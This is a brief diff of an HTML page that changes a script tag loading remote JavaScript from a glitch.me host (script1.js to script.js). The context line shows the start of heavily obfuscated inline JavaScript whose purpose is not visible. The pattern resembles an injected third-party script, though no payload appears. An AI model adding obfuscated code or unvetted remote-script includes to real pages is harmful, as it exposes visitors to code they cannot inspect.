@@ -441,7 +441,7 @@ const _0x14c62c=_0x3eae;(function(_0xd17f64,_0x11e92b){const _0x8a710d=_0x3eae,_
   type="text/javascript"
   src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.js"
 ></script>
-    <script type="text/javascript" src="https://scripth.glitch.me/script1.js"></script>
+    <script type="text/javascript" src="https://scripth.glitch.me/script.js"></script>
    
 
   </body>
